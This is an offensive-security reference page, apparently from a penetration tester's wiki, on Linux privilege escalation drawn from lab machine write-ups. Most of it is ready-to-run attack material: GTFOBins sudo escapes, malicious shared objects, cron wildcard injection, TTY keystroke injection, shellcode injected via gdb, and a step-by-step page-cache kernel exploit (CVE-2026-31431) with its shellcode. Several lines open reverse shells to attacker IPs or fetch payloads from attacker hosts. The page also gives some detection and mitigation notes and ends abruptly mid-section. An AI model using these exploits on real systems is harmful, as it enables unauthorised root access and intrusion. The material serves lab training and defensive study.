---
title: "Linux Privilege Escalation"
type: technique
tags: [0xdf, exploitation, git-poc, htb, linux, post-exploitation, privilege-escalation, thm]
phase: post-exploitation
date_created: 2026-05-08
date_updated: 2026-07-15
sources: [thm-linux-privesc, thm-python-lib-hijack, thm-lxd-gamingserver, git-copyfail-go, git-cve-2026-31431, 0xdf-linux-privesc, hacktricks-linux]
---

# Linux Privilege Escalation

> Kernel/local LPE CVE catalog (Dirty*/PwnKit/Looney/nf_tables + Rafael Tinoco's 2026 page-cache LPE set + Windows/AD privesc): [[privesc-exploit-arsenal]]. Treat kernel CVEs as a last resort, verify patch level first.

## What it is

Linux privilege escalation is the process of gaining higher-level permissions (typically root) on a Linux system after initial access as a low-privilege user, by exploiting misconfigurations, weak permissions, vulnerable software, or kernel bugs.

## How it works

The system grants elevated access when an attacker abuses a mechanism that was intended for legitimate use: a SUID binary, a sudo rule, a writable cron script, or a kernel vulnerability. The escalation typically results in a root shell or a shell as another privileged user.

## Prerequisites

- Low-privilege shell on the target
- Ability to read files and run commands
- Time to enumerate the system

---

## Methodology

### Step 1: System Enumeration

```bash
# OS and kernel version
uname -a
cat /etc/os-release
cat /proc/version

# Current user and groups
id
whoami
groups

# Hostname and network
hostname
ip a
cat /etc/hosts

# Environment variables (look for LD_PRELOAD, PATH)
env
```

### Step 2: Run Automated Enumeration

```bash
# LinPEAS (most comprehensive)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# Or upload and run:
sh linpeas.sh | tee linpeas_output.txt

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh && ./LinEnum.sh

# Linux Exploit Suggester
wget https://github.com/The-Z-Labs/linux-exploit-suggester/raw/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh && ./linux-exploit-suggester.sh
```

### Step 3: Manual Checks (see sections below)

---

## Key Attack Vectors

### SUID / SGID Binaries

SUID binaries run as the file owner (often root) regardless of who executes them.

```bash
# Find all SUID/SGID binaries
find / -type f -perm -04000 -ls 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Check GTFOBins for exploitation methods
# https://gtfobins.github.io/
```

**Example — SUID environment variable hijacking:**

```bash
# Check what binaries a SUID file calls without absolute path
strings /usr/local/bin/suid-env

# Create a malicious version of the called binary
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
gcc /tmp/service.c -o /tmp/service
export PATH=/tmp:$PATH
/usr/local/bin/suid-env
```

**Example — Shared object injection via SUID:**

```bash
# Find missing shared objects
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"

# Create the missing .so file
mkdir -p /home/user/.config
cat > /home/user/.config/libcalc.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
EOF
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```

**Example — SUID `jjs` (Nashorn) — Mango (Medium):**

`jjs` is the Java Nashorn JavaScript REPL. When set SUID root (or running as a higher-privileged user), its Java I/O APIs run as that user. Drop an SSH key into `/root/.ssh/`:

```bash
ls -la /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
# -rwsr-sr-- 1 root admin ...

/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```

```javascript
// in the jjs REPL:
var FileWriter = Java.type("java.io.FileWriter");
var fw = new FileWriter("/root/.ssh/authorized_keys");
fw.write("ssh-rsa AAAA... attacker@kali");
fw.close();
```

```bash
ssh -i ~/.ssh/id_rsa root@target
```

Read-only variant (read `/root/root.txt`):

```javascript
var BufferedReader = Java.type("java.io.BufferedReader");
var FileReader = Java.type("java.io.FileReader");
var br = new BufferedReader(new FileReader("/root/root.txt"));
print(br.readLine());
```

---

### Sudo Misconfigurations

```bash
# List allowed sudo commands
sudo -l
```

**Exploit sudo with GTFOBins** — visit https://gtfobins.github.io/ for the specific binary.

**Example — sudo zip:**

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

**Example — sudo yum (plugin injection):**

```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF
cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF
cat >$TF/y.py<<EOF
import os, yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF
sudo yum -c $TF/x --enableplugin=y
```

**LD_PRELOAD with sudo (if env_keep includes LD_PRELOAD):**

```c
// save as /tmp/shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so apache2
```

#### From the Wild — HTB Easy/Medium sudo chains

| Machine | Rule | Technique |
|---------|------|-----------|
| Traverxec (Easy) | `sudo journalctl -n5 -unostromo.service` | shrink TTY so `journalctl` invokes `less`, then `!/bin/bash` |
| Academy (Easy) | `(ALL) /usr/bin/composer` | `composer.json` `scripts` entry runs as root |
| Knife (Easy) | `NOPASSWD: /usr/bin/knife` | `knife exec -E "exec '/bin/bash'"` |
| CozyHosting (Easy) | `(root) /usr/bin/ssh *` | `ssh -o ProxyCommand=` runs arbitrary commands as root |
| Meta (Medium) | `NOPASSWD: /usr/bin/neofetch ""` + `env_keep+=XDG_CONFIG_HOME` | malicious `~/.config/neofetch/config.conf` |
| SneakyMailer (Medium) | `NOPASSWD: /usr/bin/pip3` | `setup.py` with `cmdclass={'install': Exploit}` runs during `sudo pip3 install .` |
| Previous (Medium) | `sudo /usr/bin/terraform apply` | `~/.terraformrc` `dev_overrides` points provider at user-writable dir |
| Admirer (Easy) | `SETENV` on `/opt/scripts/admin_tasks.sh` | `sudo PYTHONPATH=/var/tmp ...` hijacks an `import shutil` |
| Armageddon (Easy) | `NOPASSWD: /usr/bin/snap install *` | install hook in attacker-built `.snap` runs as root |
| Blunder (Easy) | `(ALL, !root) /bin/bash` | `sudo -u#-1 /bin/bash` (CVE-2019-14287) |
| PermX (Easy) | `NOPASSWD: /opt/acl.sh` | symlink + `setfacl` to grant write on `/etc/passwd` |
| Photobomb (Easy) | `SETENV` on `/opt/cleanup.sh` calling bare `find` | `sudo PATH=$PWD:$PATH /opt/cleanup.sh` |
| Previse (Easy) | `sudo /opt/scripts/access_backup.sh` (no `secure_path`) | `gzip` shim in `/dev/shm` via `PATH` prefix |

**Example — sudo journalctl (Traverxec):**

```bash
sudo -l    # /usr/bin/journalctl
# shrink terminal so journalctl uses less as pager
sudo /usr/bin/journalctl -n5 -unostromo.service
# in less:
!/bin/bash
```

**Example — sudo composer (Academy):**

```bash
TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' > $TF/composer.json
sudo composer --working-dir=$TF run-script x
```

**Example — sudo knife exec (Knife):**

```bash
sudo knife exec -E "exec '/bin/bash'"
# alternate via vim:
sudo knife data bag create 0xdf output -e vim
# then in vim:
:!/bin/bash
```

**Example — sudo ssh ProxyCommand (CozyHosting):**

```bash
# ProxyCommand runs before the SSH connection — as root
sudo ssh -o ProxyCommand='cp /bin/bash /tmp/0xdf' localhost
sudo ssh -o ProxyCommand='chmod 6777 /tmp/0xdf' localhost
/tmp/0xdf -p
# or single-shot via GTFOBins:
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

**Example — sudo neofetch + XDG_CONFIG_HOME (Meta):**

```bash
mkdir -p ~/.config/neofetch
echo 'exec /bin/sh' > ~/.config/neofetch/config.conf
XDG_CONFIG_HOME=~/.config sudo neofetch
```

**Example — sudo pip3 install with malicious setup.py (SneakyMailer):**

```python
# setup.py
from setuptools import setup
from setuptools.command.install import install
import os

class Exploit(install):
    def run(self):
        os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'")

setup(name='evil', version='1.0', cmdclass={'install': Exploit})
```

```bash
cd /dev/shm/evil
sudo pip3 install .
```

**Example — sudo PYTHONPATH hijack via SETENV (Admirer):**

The `sudoers` rule uses `SETENV` (per-command env-passing), distinct from `env_keep`. The wrapped script imports a library from a directory you control:

```bash
# /opt/scripts/admin_tasks.sh option 6 -> python /opt/scripts/backup.py
# backup.py: import shutil; shutil.make_archive(...)
cat > /var/tmp/shutil.py << 'EOF'
import os
def make_archive(*a, **kw):
    os.system("cp /bin/bash /tmp/0xdf && chmod 6777 /tmp/0xdf")
EOF
sudo PYTHONPATH=/var/tmp /opt/scripts/admin_tasks.sh 6
/tmp/0xdf -p
```

**Example — sudo terraform with `dev_overrides` (Previous):**

```bash
cat > ~/.terraformrc << 'EOF'
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
EOF

cat > /dev/shm/terraform-provider-examples << 'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/0xdf
chmod 6777 /var/tmp/0xdf
EOF
chmod +x /dev/shm/terraform-provider-examples

sudo terraform -chdir=/opt/examples apply
/var/tmp/0xdf -p
```

Alternate **terraform → cron.d** primitive: with `TF_VAR_source_path` pointing at a symlinked staging dir, terraform's `local-file` provisioner copies attacker content into `/etc/cron.d/`:

```bash
mkdir -p /dev/shm/root/examples
ln -sf /etc/cron.d/pwn docker/previous/public/examples/pwn
echo "* * * * * root touch /tmp/rootcron" > /dev/shm/root/examples/pwn
TF_VAR_source_path=/dev/shm/root/examples/pwn sudo terraform -chdir=/opt/examples apply
```

**Example — sudo snap install --devmode (Armageddon):**

`snap install --devmode` runs an arbitrary `install` hook as root, no signature required. Build the snap off-target with `snapcraft`, then:

```bash
# attacker host: build malicious snap
snapcraft init
mkdir -p snap/hooks
cat > snap/hooks/install << 'EOF'
#!/bin/bash
mkdir -p /root/.ssh
echo "ssh-ed25519 AAAA... attacker@kali" >> /root/.ssh/authorized_keys
EOF
chmod a+x snap/hooks/install
snapcraft

# target: install
curl http://10.10.14.7/payload_0.1_amd64.snap -o p.snap
sudo snap install --devmode p.snap
ssh -i ~/.ssh/id_ed25519 root@target
```

Note: this is **not** the snapd-socket CVE-2019-7304 "Dirty Sock" exploit, which targets the daemon directly; this is `sudo`-delegated `snap install` abuse on a host where the daemon is patched.

---

### CVE-2019-14287 — sudo "-u#-1" bypass

Affects sudo < 1.8.28. When a rule lists `(ALL, !root)` or any `Runas_Spec` that *excludes* root but allows other users, `sudo -u#-1` (or `-u#4294967295`) is parsed as UID -1, which `setresuid()` treats as "do not change" — leaving euid at 0.

```bash
sudo -l
# (ALL, !root) /bin/bash
sudo --version  # confirm < 1.8.28
sudo -u#-1 /bin/bash
id  # uid=0(root)
```

Real chain: **HTB Blunder** (`hugo` may run `(ALL, !root) /bin/bash`, sudo 1.8.25p1).

---

### Sudo + Script Wildcard / Argument Injection

When a `sudo`-allowed script `cp`s, `rsync`s, `tar`s, or `chown`s a wildcard (`*`) glob in a directory you can write to, drop filenames that the binary mistakes for arguments. Classic short list:

| Wildcard binary | Magic filename(s) | Effect |
|-----------------|-------------------|--------|
| `cp` | `--preserve=mode`, `--target-directory=DIR` | Preserve SUID bit, redirect destination to a symlinked dir |
| `tar` | `--checkpoint=1`, `--checkpoint-action=exec=sh CMD` | Run `CMD` during tar |
| `rsync` | `-e sh CMD`, `--rsh=CMD` | Run `CMD` as transport |
| `chown` | `--reference=FILE` | Change ownership to match another file |

**Example — sudo `cp *` wildcard abuse (Dynstr — Medium):**

```bash
cd /dev/shm
echo 100 > .version          # satisfy script precondition
cp /bin/bash .
chmod 4777 bash
touch -- --preserve=mode      # `cp` interprets this as a flag
sudo /usr/local/bin/bindmgr.sh
/etc/bind/named.bindmgr/bash -p
```

Alternate primitive on the same machine — redirect the `cp` destination to `/etc/`:

```bash
cd $(mktemp -d)
cp /etc/passwd .
echo 'oxdf:$1$xxx$hash:0:0:pwned:/root:/bin/bash' >> passwd
echo 1000 > .version
touch -- '--target-directory=etc'
ln -s /etc etc
sudo /usr/local/bin/bindmgr.sh
su - oxdf
```

---

### Sudo runs an interpreter or a password-check script (Contrabando)

Three distinct, very common flaws when a `sudo` rule points at a script or an interpreter:

**(a) Interpreter arg-glob picks the vulnerable version.** A rule like `(root) NOPASSWD: /usr/bin/python* /opt/generator/app.py` uses a `*` glob, so you choose the interpreter. Pick `python2` where the others are patched, or any version whose call is injectable:
```bash
sudo /usr/bin/python2 /opt/generator/app.py
```

**(b) Python2 `input()` is `eval()`.** In Python 2, `input(prompt)` evaluates the typed text as a Python expression (`raw_input()` is the safe one). Any `sudo python2 script.py` that calls `input()` is RCE as root:
```bash
# at the input() prompt:
__import__("os").system("/bin/bash")
# non-interactive (feed answers in order: here length=12, then the eval payload):
printf '12\n__import__("os").system("id; cat /root/root.txt")\n' | sudo /usr/bin/python2 /opt/generator/app.py
```

**(c) Unquoted `[[ == ]]` in a sudo bash script is a glob oracle.** A check `if [[ $secret == $user_input ]]` with `$user_input` UNQUOTED treats your input as a glob, so `*` matches anything and a prefix probe `known*` leaks the secret one char at a time. Blind brute:
```bash
# vault runs as root via:  sudo -n /usr/bin/bash /usr/bin/vault
known=""
for ((i=0;i<40;i++)); do for c in {a..z} {A..Z} {0..9} _ - .; do
  echo "${known}${c}*" | sudo -n /usr/bin/bash /usr/bin/vault | grep -q matched && { known="${known}${c}"; break; }
done; done; echo "secret=$known"
```
The leaked secret is frequently the user's own sudo/login password (reuse for `su`/`sudo`). Fix: quote the RHS (`"$user_input"`). See [[password-cracking]] for the seed-mutation angle.

---

### Sudo + ACL Abuse on System Files

If a `sudo` rule runs `setfacl` (or a script that calls it) and accepts a user-controlled path, drop a symlink in the expected target to redirect the ACL grant onto a sensitive file.

**Example — PermX (Easy):**

```bash
sudo -l
# (root) NOPASSWD: /opt/acl.sh
# script: setfacl -m "u:$1:$2" "/home/mtz/$3"

ln -s /etc/passwd /home/mtz/passwd
sudo /opt/acl.sh mtz rwx passwd
# /etc/passwd is now writable by mtz
openssl passwd -1 hacker
echo 'oxdf:$1$...:0:0:pwned:/root:/bin/bash' >> /etc/passwd
su oxdf
```

Same primitive works against `/etc/sudoers` (add `oxdf ALL=(ALL) NOPASSWD: ALL`) or `/etc/crontab`.

---

### TTY Pushback (TIOCSTI) — hijack a root `su -`/shared terminal

When **root runs `su - <you>` inside a real terminal (PTY)** and you control that user's
startup files, you can push keystrokes into root's terminal via the `TIOCSTI` ioctl
(`0x5412`). `su -` loads the target user's `~/.bashrc`/`~/.profile`; from there, stuff a
command into the shared TTY input queue. When `su` returns to root's shell, root's shell
reads and executes your injected line **as root**. Classic THM Backtrack: a root cron used
paramiko to open a PTY, `su - orville`, then `zip` the webroot — orville's `.bashrc` is
attacker-controlled.

```bash
# Prepend to the low user's ~/.bashrc (BEFORE the `case $- in *i*)..return` guard, so it
# runs even for su -'s login shell). `exit\n` closes YOUR shell first so the remaining
# keystrokes are read by root's PARENT shell, not consumed by your own su session:
perl -e 'ioctl(STDIN,0x5412,$_) for split //,"exit\ncp /bin/bash /tmp/rb;chmod +s /tmp/rb\n"' 2>/dev/null
# next time root does `su - <you>`:  /tmp/rb -p   -> uid=0
```

Notes:
- **Spot it with pspy:** a per-minute `sshd: root [priv]` + `su - <user>` + interactive
  `-bash`/`landscape-sysinfo` (MOTD) = a root PTY dropping to your user. Nothing in the
  login *path* needs to be writable — only the target user's dotfiles.
- **`exit\n` prefix is required** if root's `su -` is interactive; without it your own
  interactive shell eats the injection (it runs as *you*, not root).
- **Kernel gate:** `TIOCSTI` is allowed on kernels before the `dev.tty.legacy_tiocsti=0`
  lockdown (default-off from ~6.2 / backports). 5.4/5.15 era boxes still allow it.
- Restore the dotfile afterward — the payload fires on every login and is noisy.

---

### Cron Jobs

```bash
# View system cron jobs
cat /etc/crontab
crontab -l
ls -la /etc/cron.*

# View world-writable scripts called by root's cron
find / -writable -type f 2>/dev/null | grep -v proc
```

**Example — overwrite a world-writable cron script:**

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh
# Wait for cron to run, then:
/tmp/bash -p
```

**Example — wildcard injection in cron (tar):**

```bash
# cron runs: tar czf /tmp/backup.tar.gz /home/user/*
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
touch /home/user/--checkpoint=1
touch '/home/user/--checkpoint-action=exec=sh runme.sh'
# Wait for cron to run:
/tmp/bash -p
```

#### Discovering crons with pspy

Many cron-based chains are invisible to `cat /etc/crontab` (e.g. systemd timers, root-owned `/etc/cron.d/*` not world-readable, services calling `cron.hourly` scripts). Use [[pspy]] to watch process exec live:

```bash
wget http://ATTACKER:8000/pspy64
chmod +x pspy64
./pspy64           # -pf for filesystem events
```

Look for `UID=0 ... CRON -f` lines followed by the child commands; that's the schedule + target script you need to abuse.

#### From the Wild — HTB Easy/Medium cron chains

| Machine | Trigger | Primitive |
|---------|---------|-----------|
| Epsilon (Medium) | root cron runs `tar` then `tar -chvf <checksum> ...` 5s later | Symlink `checksum` → `/root` between the two `tar` runs; `-h` follows the symlink and archives `/root/` |
| Slonik (Medium) | root cron `pg_basebackup` copies `/var/lib/postgresql/14/main` | Drop SUID `bash` in the live data dir; backup copies it as root-owned SUID |
| Inject (Easy) | root cron `ansible-parallel /opt/automation/tasks/*.yml` | Write a malicious YAML playbook to `tasks/`; runs as root next minute |
| Previous (Medium) | cron picks up files in `/etc/cron.d/` (terraform copy primitive lands here) | See sudo terraform example above |

**Example — tar symlink/`-h` race (Epsilon):**

```bash
# pspy shows the timing:
# UID=0 ... /usr/bin/tar -cvf /opt/backups/<rand>.tar /var/www/app/
# 5s later:
# UID=0 ... /usr/bin/tar -chvf /var/backups/web_backups/<rand>.tar /opt/backups/checksum /opt/backups/<rand>.tar

cd /opt/backups
while :; do
  if test -f checksum; then
    rm -f checksum
    ln -s /root checksum    # second tar follows symlink (-h) → archives /root/
    sleep 5
    break
  fi
  sleep 1
done

# extract the next /var/backups/web_backups/*.tar locally to read root.txt / id_rsa
cp /var/backups/web_backups/<new>.tar /dev/shm/
cd /dev/shm && tar xf <new>.tar
cat opt/backups/checksum/root.txt
```

**Example — pg_basebackup data-dir SUID drop (Slonik):**

`pg_basebackup` running as root will copy whatever's in the postgres data dir to the destination, preserving the postgres user's content as root-owned:

```bash
# as postgres:
cd ~/14/main
cp /bin/bash .
chmod 6777 bash

# wait for the next cron tick:
cd /opt/backups/current
ls -l bash    # -rwsrwsrwx 1 root root ...
./bash -p
```

**Example — Ansible playbook injection (Inject):**

If a root cron iterates over a `*.yml` glob in a directory you can write to (groups `staff`, `developer`, `ansible`, `automation`, ...), drop a playbook with a `shell:` task:

```bash
# Discover the schedule:
./pspy64
# UID=0 ... /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml

cat > /opt/automation/tasks/0xdf.yml << 'EOF'
- hosts: localhost
  tasks:
    - name: privesc
      shell: cp /bin/bash /tmp/0xdf; chmod 4755 /tmp/0xdf
EOF

# wait for cron:
/tmp/0xdf -p
```

---

### Writable Init / Service Files

Systemd is the common case (see cheatsheet) but older Ubuntu still ships **Upstart** (`/etc/init/*.conf`). If group permissions on these configs are loose and a `sudo /sbin/initctl` rule exists, you can add an `exec` line to a job and start it as root.

**Example — Upstart abuse (Spectra — Easy):**

```bash
# /etc/init/test.conf owned root:developers, mode 664
id    # uid=1000(katie) groups=...,developers

cat >> /etc/init/test.conf << 'EOF'
script
  exec /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
end script
EOF

sudo initctl start test
```

For modern systemd targets, see the cheatsheet `## Writable Systemd Services / Timers` section.

---

### Capabilities

Linux capabilities allow processes to have specific root-equivalent privileges without full root.

```bash
# Find binaries with capabilities (run from low-priv shell — /usr/sbin/getcap may need PATH)
/usr/sbin/getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
```

**cap_setuid+ep on python** (Cap — Easy):

```bash
getcap /usr/bin/python3.8
# /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

python3 -c 'import os, pty; os.setuid(0); pty.spawn("/bin/bash")'
```

**cap_setuid+ep on perl + AppArmor profile bypass** (Nunchucks — Easy):

`/usr/bin/perl` with `cap_setuid+ep` would normally yield root via `perl -e '...; exec "/bin/sh"'`. On Ubuntu, the `usr.bin.perl` AppArmor profile may block direct `perl -e` execution. Bypass by writing a shebang script and executing it directly — AppArmor matches by binary path, not script path:

```bash
getcap /usr/bin/perl
# /usr/bin/perl = cap_setuid+ep

# direct -e is blocked by AppArmor on some hosts:
perl -e 'use POSIX(setuid); POSIX::setuid(0); exec "/bin/sh";'   # fails

# shebang-script bypass:
cat > /tmp/a.pl << 'EOF'
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/a.pl
/tmp/a.pl
```

**cap_sys_ptrace+ep on gdb** (Faculty — Medium):

`cap_sys_ptrace` lets a binary attach to any process (even root-owned) and read/write memory. Use it to inject shellcode at the instruction pointer of a long-running root process.

```bash
# Identify the cap and a candidate root pid:
getcap /usr/bin/gdb
# /usr/bin/gdb = cap_sys_ptrace+ep

# Find a long-running root process
ps -ef | grep ^root

# Generate Linux x64 bind shell shellcode (msfvenom on attacker):
msfvenom -p linux/x64/shell_bind_tcp LPORT=5600 -f raw -o /tmp/sc
# Convert raw bytes to 8-byte words for gdb 'set {long}' (see Faculty writeup)

# On target:
gdb -q -p <root_pid>
```

```gdb
# Inside gdb — write shellcode at the saved instruction pointer:
set {long}($rip+0)  = 0xWORD0
set {long}($rip+8)  = 0xWORD1
# ... (continue until shellcode fully written, padded to 8-byte boundary with 0xcc)
c
```

```bash
# Connect to bind shell:
nc 127.0.0.1 5600
```

**Other useful capabilities:**

```bash
# cap_dac_read_search on tar — read any file
/usr/bin/tar -cf /dev/stdout /etc/shadow | tar -x -O

# cap_dac_override on a copy of bash — overwrite root-only files
./bash -c 'echo root:0:0::/root:/bin/bash > /etc/passwd'   # if cap_dac_override is set

# cap_net_raw — craft arbitrary packets (not usually privesc but enables sniffing)
```

#### From the Wild — HTB Easy/Medium capabilities

| Machine | Binary | Capability | Trick |
|---------|--------|------------|-------|
| Cap (Easy) | `/usr/bin/python3.8` | `cap_setuid,cap_net_bind_service+eip` | `os.setuid(0); pty.spawn("bash")` |
| Nunchucks (Easy) | `/usr/bin/perl` | `cap_setuid+ep` | shebang script avoids AppArmor `usr.bin.perl` profile |
| Faculty (Medium) | `/usr/bin/gdb` | `cap_sys_ptrace+ep` | attach to root pid, write shellcode at `$rip`, `c` |

---

### Kernel Exploits

```bash
# Check kernel version
uname -r
cat /proc/version

# DirtyCow (CVE-2016-5195) — kernel 2.6.22 to 3.x/4.x
gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w
./c0w
passwd  # now runs as root
```

See also **Dirty Frag** (CVE-2026-43284 / CVE-2026-43500) — page-cache LPE via xfrm-ESP + RxRPC, no race condition, affects kernels from 2017 up to mainline (CVE-2026-43500 unpatched as of 2026-05-09).

---

### CVE-2026-31431 — Copy Fail (AF_ALG Page-Cache Overwrite LPE)

**Root cause:** The 2017 `algif_aead` in-place optimization allows `splice(2)` to inject read-only page-cache pages as the writable *destination* of a kernel crypto operation. This means any unprivileged user can overwrite arbitrary read-only files in the kernel's page cache without modifying the file on disk.

**Affected kernels:**
```
Floor:   v4.14  (commit 72548b093ee3, August 2017)
Ceiling: April 2026 (commit a664bf3d603d — fix separates src/dst scatterlists)
All major distros (Ubuntu, RHEL, SUSE, Amazon Linux, Debian) confirmed vulnerable
at disclosure time. Distro backports began ~2026-04-29.
```

**Precise write mechanic:** `authencesn` writes the AAD's `seqno_lo` field (bytes 4–7 of the 8-byte AAD sent via `sendmsg`) into `dst[assoclen + cryptlen]` — the splice-sourced page-cache page is the destination. The 4 controllable bytes land at a deterministic offset within the page, corresponding to the `offset_src` passed to `splice()`.

**Detect (non-destructive):**
```bash
# Python detector — creates a temp sentinel file only, never touches system files
python3 test_cve_2026_31431.py
# Exit 0 = NOT vulnerable | Exit 2 = VULNERABLE | Exit 1 = test error
```

**Verify target is vulnerable (manual):**
```bash
uname -r   # must be >= 4.14 and lack the fix backport
# Check distro changelog or kernel git log for a664bf3d603d
cat /proc/crypto | grep -A5 "authencesn"   # present = AF_ALG AEAD is loaded
```

**Technique A — overwrite `/usr/bin/su` with shellcode (Go, no deps):**
```bash
# Transfer copyfail-go static binary (pre-built, supports amd64/i386/arm64/armv7l)
chmod +x copyfail-go
./copyfail-go --backup /tmp/su    # overwrites su page cache → root shell
./copyfail-go --backup /tmp/su --exec /path/to/binary  # run binary as root

# Restore su from root shell:
cat /tmp/su > /usr/bin/su && touch -r /tmp/su /usr/bin/su && rm /tmp/su
```

**Technique B — flip UID to 0 in `/etc/passwd` page cache (Python, stdlib only):**
```bash
# Requirements: user must have a 4-digit UID (1000–9999); no nscd/sssd caching
python3 exploit_cve_2026_31431.py           # dry run: patches page cache, prints next steps
python3 exploit_cve_2026_31431.py --shell   # patch + exec `su <user>` (enter your own password)

# PAM validates against /etc/shadow (unchanged), but setuid() sees UID 0 from page cache
```

**How Technique B works (step by step):**
1. Parse `/etc/passwd` on disk to find the byte offset of the UID field
2. Call `write4(PASSWD, uid_off, b"0000")`:
   - Open `/etc/passwd` read-only; `read(4096)` to prime the page cache
   - Create `AF_ALG` socket → bind `authencesn(hmac(sha256),cbc(aes))` → set zero key
   - `sendmsg([b"\x00\x00\x00\x00" + b"0000"], cmsg=[OP=DECRYPT, IV, ASSOCLEN=8], MSG_MORE)`
   - `splice(passwd_fd, pipe_w, 32, offset_src=uid_off)` → `splice(pipe_r, op_fd, 32)`
   - `recv(op_fd)` → `EBADMSG` (auth fails; scratch write fired regardless)
3. Re-read `/etc/passwd` via page cache to verify `"0000"` landed
4. Confirm `pwd.getpwnam(user).pw_uid == 0` (libc reads page cache)
5. `execvp("su", ["su", user])` — enter your real password; PAM promotes to uid=0

**NSS cache caveat:** If `nscd` or `sssd` is running, `getpwnam` may return the real UID from its cache even after the page-cache patch. Kill or bypass the cache, or pick a user not cached by the daemon.

**How the shellcode exploit works (Technique A, technical):**
1. Open `/usr/bin/su` read-only
2. Create `AF_ALG` socket, bind to `authencesn(hmac(sha256),cbc(aes))`
3. Set dummy key + `authsize=4`; `accept(2)` via raw syscall (Go's `Accept` sends non-NULL addr → `ECONNABORTED`)
4. Send CMSGs: `ALG_SET_OP=DECRYPT`, `ALG_SET_IV`, `ALG_SET_AEAD_ASSOCLEN`
5. `splice(file→pipe→socket)` — moves read-only page-cache refs into crypto sink
6. `recv(socket)` — triggers in-place overwrite; repeat 4 bytes at a time
7. Execute `su` — kernel serves overwritten page-cache copy → `setuid(0)` + `execve("/bin/sh")`

**Shellcode written to su's page cache (amd64):**
```asm
_start:
    xor eax, eax; xor edi, edi; mov al, 0x69; syscall   ; setuid(0)
    lea rdi, [rel sh]; xor esi, esi; push 0x3b; pop rax; cdq; syscall  ; execve("/bin/sh")
sh: db "/bin/sh", 0
```

**Advantages over prior page-cache LPEs (DirtyCow, DirtyPipe):**
- **No race window** — straight-line logic flaw, not a TOCTOU
- **No kernel offset** — works on any distro kernel in affected range
- **No disk writes** — `stat`/checksums unchanged; forensics see nothing on-disk

**Cleanup after exploitation:**
```bash
# After Technique B --shell (from root shell, or unprivileged):
echo 3 > /proc/sys/vm/drop_caches                     # from root shell
# OR unprivileged eviction:
python3 -c "import os; fd=os.open('/etc/passwd',os.O_RDONLY); os.posix_fadvise(fd,0,0,os.POSIX_FADV_DONTNEED); os.close(fd)"
# Reboot also clears all page cache corruption
```

**Mitigation:**
```bash
# Persistent block — survives reboots; apply before patched kernel is available
sudo tee /etc/modprobe.d/disable-algif-aead.conf <<< 'install algif_aead /bin/false'
sudo rmmod algif_aead 2>/dev/null
# Verify: python3 test_cve_2026_31431.py  →  "Precondition not met", exit 0

# Permanent — apply distro kernel patch (vendor advisories from ~2026-04-29)
```

**Detection:**
```bash
# No disk write → file hash unchanged; page cache differs from disk
ss -a | grep alg                                        # AF_ALG sockets open
# Audit: socket(AF_ALG) + accept + sendmsg + splice sequence from non-root
auditctl -a always,exit -F arch=b64 -S socket -F a0=38  # 38 = AF_ALG
```

**Sources:** `raw/git/copyfail-go/` (Go, static binary), `raw/git/cve_2026_31431/` (Python, detector + /etc/passwd technique); see also [copy.fail](https://copy.fail)

---

### Weak File Permissions

**Writable /etc/passwd:**

```bash
# Check if writable
ls -la /etc/passwd

# Generate password hash
openssl passwd -1 -salt salt newpassword

# Add root-equivalent user
echo 'hacker:$1$salt$<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

**Readable /etc/shadow:**

```bash
ls -la /etc/shadow

# If readable: unshadow and crack
unshadow /etc/passwd /etc/shadow > /tmp/combined.txt
hashcat -m 1800 /tmp/combined.txt /usr/share/wordlists/rockyou.txt
```

---

### NFS no_root_squash

```bash
# Check NFS exports
cat /etc/exports
showmount -e <TARGET_IP>

# If no_root_squash is present:
mkdir /tmp/nfs_mount
mount -o rw,vers=2 <TARGET_IP>:/tmp /tmp/nfs_mount
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/nfs_mount/x.c
gcc /tmp/nfs_mount/x.c -o /tmp/nfs_mount/x
chmod +s /tmp/nfs_mount/x
/tmp/x      # run from target
```

---

### PATH Hijacking

```bash
